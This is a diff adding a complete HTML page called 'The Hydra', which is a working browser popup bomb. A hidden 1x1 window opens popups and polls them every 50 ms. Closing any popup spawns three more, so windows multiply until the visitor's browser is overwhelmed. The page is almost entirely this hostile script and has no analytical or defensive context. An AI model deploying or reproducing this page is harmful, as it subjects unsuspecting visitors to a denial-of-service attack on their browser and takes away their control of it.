@@ -1,0 +1,45 @@
+<html>
+
+<head>
+    <title>The Hydra</title>
+    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/water.css@2/out/water.css'>
+</head>
+
+<body>
+    <div class="icon">We Are The Hydra.</div>
+    <script>
+        window.plsclose = 'no'
+        window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
+        function openNew() {
+            var popup = window.open(window.location.href + '?popup=popup', '', 'width=350,height=250');
+
+            var popupTick = setInterval(function () {
+                if (popup.closed) {
+                    clearInterval(popupTick);
+                    if (window.plsclose == "no") {
+                        openNew()
+                        openNew()
+                        openNew()
+                    }
+                }
+            }, 50);
+
+            return false;
+        }
+
+        if (window.clone === 'main') {
+            window.open(window.location.href + '?popup=safe', '', 'width=1,height=1')
+        } else if (window.clone === 'safe') {
+            document.querySelector('.icon').innerHTML = ''
+            openNew()
+        }
+    </script>
+    <style>
+        body {
+            display: grid;
+            place-items: center;
+        }
+    </style>
+</body>
+
+</html>
